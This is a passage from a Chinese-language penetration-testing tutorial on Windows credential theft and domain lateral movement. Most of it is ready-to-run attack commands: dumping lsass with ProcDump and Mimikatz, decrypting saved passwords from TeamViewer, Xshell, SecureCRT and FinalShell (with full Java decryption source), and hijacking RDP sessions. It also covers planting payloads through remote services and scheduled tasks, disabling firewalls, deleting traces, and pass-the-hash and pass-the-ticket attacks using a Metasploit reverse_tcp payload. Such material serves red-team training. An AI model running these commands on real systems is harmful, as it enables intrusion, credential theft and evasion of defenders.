​	如果主机上装了杀毒软件，开了防火墙，例如：360、火绒之类的话。Mimikatz就会被检测为病毒，无法使用。由于Mimikatz是从lsass.exe中提取明文密码的，当无法在目标机器上运行Mimikatz时，我们可使用**ProcDump**工具将系统的lsass.exe进程进行转储，导出dmp文件，拖回到本地后，在本地再利用Mimikatz进行读取。**ProcDump**本身是作为一个正常的运维辅助工具使用，并不带毒，所以不会被杀软查杀。

- 下载地址：

```html
https://docs.microsoft.com/zh-cn/sysinternals/downloads/ProcDump
```

- 使用方法：

```html
# 将工具拷贝到目标机器上执行如下命令（需要管理员权限）
ProcDump.exe -accepteula -ma lsass.exe lsass.dmp
Mimikatz# sekurlsa::minidump lsass.dmp
Mimikatz# sekurlsa::logonPasswords full
```

![image-20210530110704742](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530110704742.png)



#### 8.2.3、PwDump7

![image-20210530110829791](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530110829791.png)



使用该工具获取hash值之后，可到cmd5.com进行解密。

![image-20210530110856279](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530110856279.png)

#### 8.2.4、Getpass

- 下载地址：

```html
https://raw.githubusercontent.com/k8gege/K8tools/master/GetPassword_x64.rar
```

![image-20210530111049752](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530111049752.png)



### 8.3、第三方运维工具密码抓取

#### 8.3.1、TeamViewer

- 下载地址：

```html
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

- 使用方法：

```html
SharpDecryptPwd.exe -TeamViewer
```

![image-20210530111303938](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530111303938.png)



#### 8.3.2、Navicat

- 下载地址：

```html
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

- 使用方法：

```html
SharpDecryptPwd.exe -NavicatCrypto
```

![image-20210530114722018](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530114722018.png)



#### 8.3.3、xshell

xshell默认的sessions会话保存地址是：

```html
xshell5:
%userprofile%\Documents\NetSarang\Xshell\Sessions
xshell6:
%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions
```



- 下载地址1：

```html
https://github.com/uknowsec/SharpDecryptPwd/raw/master/SharpDecryptPwd.exe
```

- 使用方法1：

```html
先执行 `whoami /user` 将用户名和sid保存下来，然后再使用下面的命令:
SharpDecryptPwd.exe -Xmangager -p SessionPath -s username+sid
```

![image-20210530115720655](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530115720655.png)



- 下载地址2:

```html
https://github.com/dzxs/Xdecrypt
```

- 使用方法2:

```html
先执行 `whoami /user` 将用户名和sid保存下来，然后再使用下面的命令:
python Xdecrypt.py -p "C:\Users\Admin\Documents\NetSarang Computer\6\Xshell\Sessions" -s 你的用户sid
```

![image-20210530115642733](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530115642733.png)

#### 8.3.4、securecrt

- 下载地址：

```html
https://github.com/hustlibraco/Moye/blob/master/SecureCRTDecrypt.py
```

- 使用方法：

```html
解密secureCRT保存的密码
1. 找到密码保存位置，每台服务器一个ini文件，windows系统位于
* 用户名\AppData\Roaming\VanDyke\Config\Sessions\    （安装版）
*SecureCRTSecureFX_hh_x86_7.0.0.326\Data\Settings\Config\Sessions  （绿色移动版）
2. 执行脚本，python SecureCRTDecrypt.py [filename...]
```

![image-20210530115955355](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530115955355.png)

#### 8.3.5、向日葵

1、读取向日葵程序路径，可以使用以下命令来读取：

```html
tasklist /svc #查找向日葵程序PID
wmic process where
processid=4444 get processid,executablepath,name   #processid为向日葵的PID
```

2、读取向日葵配置文件：

```html
type  D:\向日葵\SunloginClient\config.ini
```

主要关注配置中两个参数：

1.fastcode为本机识别码

2.encry_pwd为本机验证码但被加密

可以通过https://github.com/wafinfo/Sunflower_get_Password来解密encry_pwd。

#### 8.3.6、FinalShell

finalshell的配置文件存放在finalshell的安装路径下的conn文件，我们只需要找到conn下的json文件中的password字段值即可，

![image-20211228040713254](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20211228040713254.png)

使用以下脚本对获取的字段值进行解密：

```java
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;

public class FinalShellDecodePass {
    public static void main(String[] args)throws Exception {
        System.out.println(decodePass(args[0]));
    }
    public static byte[] desDecode(byte[] data, byte[] head) throws Exception {
        SecureRandom sr = new SecureRandom();
        DESKeySpec dks = new DESKeySpec(head);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
        SecretKey securekey = keyFactory.generateSecret(dks);
        Cipher cipher = Cipher.getInstance("DES");
        cipher.init(2, securekey, sr);
        return cipher.doFinal(data);
    }
    public static String decodePass(String data) throws Exception {
        if (data == null) {
            return null;
        } else {
            String rs = "";
            byte[] buf = Base64.getDecoder().decode(data);
            byte[] head = new byte[8];
            System.arraycopy(buf, 0, head, 0, head.length);
            byte[] d = new byte[buf.length - head.length];
            System.arraycopy(buf, head.length, d, 0, d.length);
            byte[] bt = desDecode(d, ranDomKey(head));
            rs = new String(bt);

            return rs;
        }
    }
    static byte[] ranDomKey(byte[] head) {
        long ks = 3680984568597093857L / (long)(new Random((long)head[5])).nextInt(127);
        Random random = new Random(ks);
        int t = head[0];

        for(int i = 0; i < t; ++i) {
            random.nextLong();
        }

        long n = random.nextLong();
        Random r2 = new Random(n);
        long[] ld = new long[]{(long)head[4], r2.nextLong(), (long)head[7], (long)head[3], r2.nextLong(), (long)head[1], random.nextLong(), (long)head[2]};
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(bos);
        long[] var15 = ld;
        int var14 = ld.length;

        for(int var13 = 0; var13 < var14; ++var13) {
            long l = var15[var13];

            try {
                dos.writeLong(l);
            } catch (IOException var18) {
                var18.printStackTrace();
            }
        }

        try {
            dos.close();
        } catch (IOException var17) {
            var17.printStackTrace();
        }

        byte[] keyData = bos.toByteArray();
        keyData = md5(keyData);
        return keyData;
    }
    public static byte[] md5(byte[] data) {
        String ret = null;
        byte[] res=null;

        try {
            MessageDigest m;
            m = MessageDigest.getInstance("MD5");
            m.update(data, 0, data.length);
            res=m.digest();
            ret = new BigInteger(1, res).toString(16);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return res;
    }
}
```

使用以下命令编译文件：

```html
javac FinalShellDecodePass.java
```

会生成我们用来解密的FinalShellDecodePass.class文件，再使用以下命令对字段值解密：

```html
java FinalShellDecodePass xxxxx
```

![image-20211228040923528](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20211228040923528.png)

### 8.4、浏览器密码抓取

#### 8.4.1、LaZagne

- 下载地址：

```html
https://github.com/ethicalhackeragnidhra/LaZagne/archive/2.3.1.zip
```

- 使用方法：

```html
laZagne.exe browsers
```

![image-20210530120249071](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530120249071.png)



#### 8.4.2、BrowserPasswordDump

- 下载地址：

```html
https://files1.majorgeeks.com/020c4877362530fccadf006a858f56ee9637177d/covertops/BrowserPasswordDump.zip
```

- 使用方法：

```html
点击setup安装完成以后，即可提取出单文件来运行使用。
```

![image-20210530120433417](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530120433417.png)

### 8.5、远程桌面连接密码抓取

查看是否有登录凭证：

```html
cmdkey /list
```

#### 8.5.1、netpass

- 下载地址：

```html
https://www.nirsoft.net/toolsdownload/netpass-x64.zip
```

- 使用说明：

```html
使用管理员权限运行即可
```

![image-20210530120713984](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210530120713984.png)



#### 8.5.2、离线解密 RDP 保存的密码

通过查看目标注册表发现了历史 RDP 的记录：

```html
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s
```

![image-20210601164912213](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601164912213.png)



发现存在 RDP 密码文件：

```html
beacon> shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
[*] Tasked beacon to run: dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
[+] host called home, sent: 89 bytes
[+] received output:
驱动器 C 中的卷没有标签。
卷的序列号是 C09B-63AC
C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录
2017-08-31  11:28    <DIR>          .
2017-08-31  11:28    <DIR>          ..
2017-08-31  11:28               482 242067442375049DD8C15BA0948FA81A
2017-08-31  11:08               482 66F17973F3B68674CB1837A732B2022A
2 个文件            964 字节
2 个目录 19,997,614,080 可用字节
```

通过把两个文件下载到本地离线进行解密：

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601165435995.png" alt="image-20210601165435995" style="zoom: 25%;" />

然后使用：procdump.exe（注意免杀问题） 把 lsass.dmp 抓下来

```html
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601165530193.png" alt="image-20210601165530193" style="zoom:25%;" />

之后通过 Mimikatz 进行获取  guidMasterKey 值：（后面会用到）

```html
mimikatz # privilege::debug
mimikatz # dpapi::cred /in:C:\66F17973F3B686XXXXXXXXXXXXXXXXXX
```

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601165626338.png" alt="image-20210601165626338" style="zoom:25%;" />

本地使用命令加载 dmp 并获取对应得 MasterKey 值：

```html
mimikatz# sekurlsa::minidump lsass.dmp //将lsaa.dmp导入
mimikatz# sekurlsa::dpapi
```

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601165713983.png" alt="image-20210601165713983" style="zoom:50%;" />



最后使用 Masterkey 解密凭证得到明文密码:

```html
dpapi::cred /in:C:\66F17973F3B6XXXXXXXXXXXXXX /masterkey:9a94787450391e74a94025c5f148a7c1d78d5e3b9d0588864a86609065c1d36XXXXXXXXXXXXXXXXXXXXXXX
```

<img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210601165750994.png" alt="image-20210601165750994" style="zoom:25%;" />



### 8.6、低权限下搜集当前机器各类密码文件

#### 8.6.1、dir收集各类密码配置文件

一般密码文件或者配置文件都是：

```html
pass.*,config.*,username.*,password.*
```

我们就可以使用 dir命令来进行文件查找，建议不要直接从 c盘根目录找，那样文件会很多，建议从 User目录下：

```html
dir /b /s user.*,pass.*,config.*,username.*,password.*
```

#### 8.6.2、for 收集各类密码配置文件

还可以通过 for 循环来查找，例如查找匹配 **pass** 文件：

```html
for /r c:\ %i in (pass.*) do @echo %i
```

#### 8.6.3、findstr 查找文件的某个字段

上面两条命令只是查找某个文件，那我们想要查找一个文件里有没有 `user`、`pass` 等字段内容，就可以使用这条命令：

```html
findstr /c:"sa" /c:"root" /si *.txt
```

### 8.7、总结

1、上述描述的抓取密码的方式，大部分需使用管理员权限才能抓取。

2、`windows`密码仅在`win2008`及以下可使用，`win10`及`server2012`及以上默认不保存明文密码，无法使用工具抓取。

## 9、对RDP常规操作

### 9.1、查看rdp服务端口

这里有两种方式可以获取rdp服务端口，一种是通过注册表

```html
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

得到连接端口为 0xd3d，转换后即为rdp端口。

```html
tasklst /svc # 查看开启远程端口的服务PID(有TermService 标志的)
netstat -ano # 查看PID ，对应的端口就是远程服务的端口
```

### 9.2、开启rdp服务

老版本和新版windows版本不一样

windows server 2003

```html
开启：
REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
关闭：
REG ADD \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 11111111 /f
开启：
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1`
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

windows server 2008

```
开启：
REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
```

### 9.3、增加影子账号

在windows中，添加账户名后面加入$符合可以使该用户在命令行中隐藏

例如：

![image-20220311025305248](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220311025305248.png)

我这里添加了一个普通用户，但是用net user命令却看不懂此用户。

但实际上确实是存在的

![image-20220311025739465](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220311025739465.png)

### 9.4、RDP劫持

​		假如我们已经控制了一台主机，通过查看任务管理器发现当前主机上还有另一个用户曾经登录过。我们就可以尝试使用rdp会话劫持的技术来访问这一个用户的用户空间，也就做到了免密登录，这种操作的好处就是攻击者会逃避事件监视器，因为攻击者并没有创建新的会话，而是有效地充当被劫持会话的用户，取而代之，所以日志文件中无法显示会话劫持记录，也记录不到。

通过以下命令查看所有已连接的用户：

```html
query user
```

![image-20220311040512933](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220311040512933.png)

可以看到有三个用户，而admin123就是当前我们远程登录的用户，这里我们利用Windows自带的tscon.exe程序来进行RDP劫持，tscon.exe可以使用户可以连接到系统上的其他远程桌面会话，或在不同的会话之间切换。

首先我们创建一个服务，命令如下：

```html
sc create servername binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#3"
```

简单解释下上面的命令，这里的3是我们要劫持的会话id，rdp-tcp#3是当前用户的session name，服务创建成功后启动服务：

```html
net start servername
```

然后会观察到窗口闪了一下，打开一个新的串口，输入whoami可以发现当前用户切换到了admin1

![image-20220311041313823](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220311041313823.png)

![image-20220311041456088](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220311041456088.png)

我们也可以使用mimikatz来进行rdp劫持的操作，相关命令如下：

```html
privilege::debug #提权
ts::sessions #查看当前主机的会话
token::elevate #提升本地管理员权限为system
ts::remote /id:1 #劫持id为1的会话
```

### 9.5、PTH RDP

​		有时候抓不到明文密码，也想登陆rdp服务咋办？这时候就可以PTH RDP，利用hash去认证rdp服务。如果使用hash远程登录RDP，服务端需要开启"Restricted Admin Mode",在Windows8.1和Windows Server 2012R2上默认开启，同时如果Win 7 和Windows Server 2008 R安装了2871997、2973351补丁也支持，Client 也需要支持Restricted Admin mode。

**手动修改注册表开启方法**

位置：

```html
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
```

新建DWORD键值DisableRestrictedAdmin，值为0，代表开启;值为1，代表关闭

```html
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
查看是否已开启
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
```

使用minikatz来进行PTH

```
privilege::debug
sekurlsa::pth /user:admin /domain:remoteserver /ntlm:hash "/run:mstsc.exe /restrictedadmin"
```

**也可以用Python实现(rdp_check.py)**

```html
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rdp_check.py
```

脚本运行前需要安装Impacket

```html
rdp_check.py /administrator@192.168.1.1 -hashes :NTLM
```

## 10、域内横向移动分析

### 10.1、为什么命令行渗透？

1. 远程登录桌面增加暴露风险；
2. 目标管理员可能对服务器禁用了远程登陆。

### 10.2、ipc连接

​		IPC---共享“命名管道”的资源，通过IPC$可以与目标机器建立连接，利用这个连接，不仅可以访问目标机器中的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息。

```html
net use \\192.168.10.12 /u:administrator password  #建立ipc连接
net use # 查看连接
copy sbn.exe \\192.168.10.12\C$\windows\temp    #复制本地文件到目标服务器
copy  \\192.168.10.12\C$\windows\temp\hash.txt	#复制目标服务器文件到本地
```

​		利用条件：

```html
1、开启139【NetBIOS协议的应用】、445端口；
2、管理员开启了默认共享；
```

​		利用失败：

```html
1、用户名或者密码错误；
2、目标没有开启139、445端口；
3、目标没有打开ipc$默认共享；
4、命令输入错误
```

使用net use命令与远程目标机器建立ipc$后，可以使用以下命令对远程目标进行操作。

#### 10.2.1、dir命令

```html
dir \\192.168.1.100\c$
```

#### 10.2.2、tasklist命令

```html
tasklist /S 192.168.1.100 /U administrator /P Admin123456
```

#### 10.2.3、计划任务

##### 1、at命令

at是windows自带用于创建计划任务的命令，它主要工作于**windows server 2008之前版本**的操作系统，使用at命令在远程目标上创建计划任务的流程如下：

- 使用net time命令确定远程机器当前的系统时间；
- 使用copy命令将payload文件复制到远程目标机器中；
- 使用at命令定时启动该payload文件；
- 删除使用at命令创建计划任务的记录。

```html
net time \\192.168.1.100 #查看远程目标的系统时间
copy calc.bat \\192.168.1.100\c$ #将文件复制到目标系统
at \\192.168.1.100 4:11PM c:\calc.bat #使用at创建计划任务，在下午4点11分执行calc.bat
at \\192.168.1.100 ID /delete #清除at记录，ID为创建计划任务的ID
```

我们还可以使用at计划任务直接执行系统命令，但是由于不会回显，我们需要把命令写到文本中，再使用type读命令，操作如下：

```html
at \\192.168.183.130 17:05:00 cmd.exe /c "ipconfig > C:\Users\Administrator\result.txt"
type \\192.168.183.130\c$\Users\Administrator\result.txt
```

![1601551376_5f75bc109a80a638ee909.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601551376_5f75bc109a80a638ee909.png)

##### 2、schtasks命令

windows vista、windows server 2008及之后版本的操作系统已经将at命令废弃了，取而代之的是schtasks命令。

用法如下：

```html
schtasks /create /s 192.168.1.33 /tn test /sc onstart /tr c:\calc.bat /ru system /f
# 在192.168.1.33这台远程主机上创建一个名称为“test”的计划任务，该任务在开机时启动，启动程序为c:\calc.bat，启动权限为system

schtasks /run /s 192.168.1.33 /i /tn "test"
# 在远程主机上运行名为"test"的计划任务
```

在建立了ipc$连接的前提下，schtasks是不需要输入密码的，如果没有建立连接，可以加上/u和/p参数来输入用户名和密码。但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问：

![1601553109_5f75c2d5bb14ea8efe81a.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601553109_5f75c2d5bb14ea8efe81a.png)

遇到这种情况，我们可以加上/u和/p参数分别设置高权限用户名和密码，如下：

```
schtasks /create /s 192.168.1.33 /u administrator /p Liu78963 /tn test /sc minute /mo 1 /tr c:\shell.exe /ru system /f
```

当计划任务运行后，为了更好地隐藏我们的行为，我们需要删除计划任务：

```html
schtasks /delete /s 192.168.1.33 /tn "test" /f #/f参数为强制删除
```

除了就像上面那样利用计划任务执行木马程序获得主机权限外，我们还可以利用schtasks计划任务直接执行系统命令，但由于不会回显，所以我们要将执行的结果写入到一个文本文件中，然后利用type命令远程读取：

```
schtasks /create /s 192.168.1.33 /tn test /sc minute /mo 1 /tr "C:\Windows\System32\cmd.exe /c 'whoami > C:\Users\Administrator\result.txt'" /ru system /f
```

![1601553817_5f75c5992ace727b1d51d.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601553817_5f75c5992ace727b1d51d.png)

```
schtasks /run /s 192.168.183.130 /i /tn test
```

![1601553911_5f75c5f709fc55ab1be33.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601553911_5f75c5f709fc55ab1be33.png)

最后利用type命令远程查看目标主机上的result.txt文件即可，如下图所示，命令执行成功：

![1601554018_5f75c6629d238702aa620.png](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601554018_5f75c6629d238702aa620.png)

#### 10.2.4、sc命令

在windows系统命令提示符中，有一个SC工具命令集。该工具集主要用来对操作系统服务进行管理，该命令是由service一词，简化而来的。我们可以用sc对目标主机远程创建服务来进行横向渗透

使用sc命令远程Windows服务操作需先建立IPC$连接，否则在执行时会返回拒绝访问。流程基本如下：

1. 先让跳板机与内网目标机DC建立ipc连接。

2. 然后让跳板机使用copy命令远程操作，将metasploit生成的payload文件bind.exe复制到目标主机DC系统C盘中。

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601607572_5f76979431cdb46882362.png)

3. 再在目标主机DC上创建一个名称为“backdoor”的服务。命令如下：

```
sc \\[主机名/IP] create [servicename] binpath= "[path]"   #创建计划任务启动程序

sc \\WIN-ENS2VR5TR3N create bindshell binpath= "c:\bind.exe"
```

注意这里的格式，“=”后面是必须空一格的，否则会出现错误。

4. 立即启动该服务：

```
sc \\WIN-ENS2VR5TR3N start bindshell
```

![image-20200727142350771](https://image.3001.net/images/20200727/1595841951.png)

执行后，msf成功上线域控：

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/1601607602_5f7697b2e5f9a7aedf921.png)

5. 使用完后删除刚才创建的服务

```
sc \\[host] delete [servicename]   #删除服务
```

我们还可以通过设置服务来关闭防火墙：

```
sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= "netsh advfirewall set allprofiles state off"

sc \\WIN-ENS2VR5TR3N start unablefirewall
```

#### 10.2.5、删除ipc连接

当我们使用完ipc$连接后，我们需要删除ipc$：

```html
net use 名称 /del /y
```

### 10.3、哈希传递攻击(Pass The Hash)

#### 10.3.1、概念

​		大多数渗透测试人员都听过哈希传递（Pass The Hash）攻击。该方法通过找到与账号相关的密码散列值（通常是 NTLM Hash）来进行攻击。在**域环境**中，用户登录计算机使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账户和密码，如果计算机的本地管理员账户和密码也是相同的，攻击者就可以通过哈希攻击的方法登录内网中的其他计算机。**在Windows Server 2012 R2及之后版本的操作系统中，默认在内存中不会记录明文密码**，Mimikatz 就读不到密码明文。此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：

```html
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

因此攻击者往往会使用攻击将散列值传递到其他计算机中进行权限验证，实现对远程计算机的控制。

​		早期版本的Windows操作系统使用LM Hash对用户密码进行验证，但是当密码大于等于15位时，就无法使用LM Hash，从Windows  Vista和Windows Server 2008版本开始，Windows操作系统默认禁用LM Hash，因为在使用NTLM Hash进行身份验证时，不会使用明文口令，而是将明文口令通过系统API转为散列值。

#### 10.3.2、使用情况

##### 10.3.2.1、工作组环境

- Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
- KB2871997是微软用来解决PsExec或者IPC连接远程查看问题的补丁，能使本地账号不再被允许远程接入计算机系统，所以在Windows Vista 之后的机器，只能是administrator(SID为500)用户的哈希值才能进行哈希传递攻击。由于SID为500的账号是一种"完全控制令牌"的权限账号,因此将Administrator改名，该账号的SID仍为500，攻击者仍然可以使用横向方法获取内网其他机子的控制权，而其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。

##### 10.3.2.2、域环境

- 只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。

#### 10.3.3、使用NTLM Hash进行哈希传递

##### 10.3.3.1、使用mimikatz进行哈希传递

###### 10.3.3.1.1、域环境

这种方法需要有本地管理员权限，命令如下：

```html
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:administrator /domain:[域控] /ntlm:[hash]"
```

![image-20210930193358951](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210930193358951.png)

运行完会弹出一个新的窗口，通过该窗口我们可以获取域内其他机子下的目录情况：

![image-20220316140433498](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316140433498.png)

此时，为了让域控制器 DC 上线 Metasploit，我们只需做以下工作:

生成一个 msf 木马 shell.exe，将 shell.exe 上传到 Windows 7 主机，然后直接使用 copy 命令将 shell.exe 复制到域控上:

```html
copy shell.exe \\DC.whoamianony.org\c$    // 将 shell.exe 复制到域控主机上
sc \\DC.whoamianony.org create backdoor binpath= "c:\shell.exe"// 在域控上创建服务启动木马
sc \\DC.whoamianony.org start backdoor     // 在域控上立即启动该服务
sc \\DC.whoamianony.org delete backdoor     // 上线后在域控上立即删除该服务
```

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/fe01e2d3-bad4-4add-bf5b-ad508f2afdc3.png)

此时虽然显示 1053 错误，但是如下图所示，域控制器成功上线，并且还是 SYSTEM 权限：

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/7c89f60b-0a0b-40f0-893c-c69098946176.png)

也能通过PsExec.exe获取其他域机子上的shell，在弹出的cmd窗口运行psexec.exe：

![image-20210930194623461](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20210930194623461.png)

这种方法的前提是你必须获取域内任意一台机子的管理员权限和域管理员的密码NTLM哈希值。

###### 10.3.3.1.2、工作组环境

```html
privilege::debug  #提升权限
sekurlsa::logonPasswords #获取NTLM哈希值
sekurlsa::pth/user:用户名 /domain:目标机器IP /ntlm:密码哈希  #使用administrator用户的NTLM哈希值进行攻击
```

##### 10.3.3.2、利用wmiexec进行哈希传递

项目地址：https://github.com/SecureAuthCorp/impacket

进入 examples 目录即可找到我们的 wmiexec.py，然后执行以下命令即可：

```html
python wmiexec.py -hashes :ab89b1295e69d353dd7614c7a3a80cec root0er.local/administrator@192.168.93.129 "whoami" 
# (proxychains4) python wmiexec.py -hashes :NTLM 域名/用户名@IP "命令"
```

##### 10.3.3.3、利用Metasploit进行哈希传递

经常使用的三个模块：

```html
auxiliary/admin/smb/psexec_command      // 在目标机器上执行系统命令              
exploit/windows/smb/psexec            // 用psexec执行系统命令         
exploit/windows/smb/psexec_psh         // 使用powershell作为payload
```

这三个模块的使用方法相同，这里以 exploit/windows/smb/psexec 模块哈希传递攻击域控制器 DC 为例：

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/191757e1-2a03-4a1c-8c31-79f60d27d620.png)

需要设置以下选项:

```html
use exploit/windows/smb/psexec
set rhosts 192.168.93.30
set smbuser administrator
set smbpass 00000000000000000000000000000000:ab89b1295e69d353dd7614c7a3a80cec  # 完整的Administrator用户的Hash
set smbdomain whoamianony
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.93.129
set lport 4444
exploit
```

注意这里的 smbpass 选项，其可以为明文密码，也可以为密码哈希，但是哈希值必须是完整的，如果不知道前面的 LM Hash 部分，可以像上面那样用 0 代替。

如下图所示，攻击成功，域控成功上线，并且是 SYSTEM 权限：

![img](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/2013e7d5-f332-44b4-abb7-0290d579385d.png)

##### 10.3.3.4、利用CobaltStrike进行哈希传递

使用CS里的mimikatz先dump下密码和hash。

![image-20220316154459247](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316154459247.png)

在凭证中可以看到。

![image-20220316154519067](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316154519067.png)

对内网进行探测后，选择一台主机，进行PTH，此时需要选择一个smb协议的Listener。

![image-20220316154619506](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316154619506.png)

回连成功。

![image-20220316154718632](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316154718632.png)

##### 10.3.3.5、利用哈希传递登录远程桌面

参考第9章中的第5节

### 10.4、票据传递攻击

​		要想使用mimikatz的哈希传递功能，必须具有本地管理员权限，mimikatz同样提供了不需要本地管理员权限进行横向渗透测试的方法，例如票据传递（Pass The Ticket,PTT）。

#### 10.4.1、使用mimikatz进行票据传递

使用mimikatz，可以将内存中的票据导出。在mimikatz中输入以下命令：

```html
privilege::debug
sekurlsa::tickets /export
```

执行完以上命令后，会在当前目录出现多个服务的票据文件，使用mimikatz清除内存中的票据：

```html
kerberos::purge
```

将Administrator@krbtgt的这个票据文件复制到远程目标机器上，将票据文件注入内存。

![image-20220316165327924](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316165327924.png)

```html
kerberos::ptt "[0;52372]-2-0-40e10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi"
```

![在这里插入图片描述](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/20210711101533935.png)

将高权限的票据文件注入内存后，重新打开一个CMD窗口即可列举远程目标的目录文件：

![image-20220316165938046](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316165938046.png)

#### 10.4.2、使用kekeo进行票据传递

​		票据传递也可以使用`gentilkiwi`开源的另一款工具`kekeo`实现。kekeo需要使用域名、用户名、NTLM Hash三者配合生成票据，再将票据导入，从而直接连接远程计算机。并且kekeo不需要本地管理员权限即可完成横向移动渗透。

项目地址：

```html
https://github.com/gentilkiwi/kekeo
```

运行kekeo后输入以下命令：

```htlm
tgt::ask /user:administrator /domain:root0er.local /ntlm:ccef208c6485269c20db2cad21734fe7 #生成票据文件
kerberos::purge #清除内存中的票据
kerberos::ptt "[0;52372]-2-0-40e10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi" #将票据文件导入内存中
```

使用命令dir \\dc\c$查看远程主机的文件

![image-20220316223641524](https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20220316223641524.png)

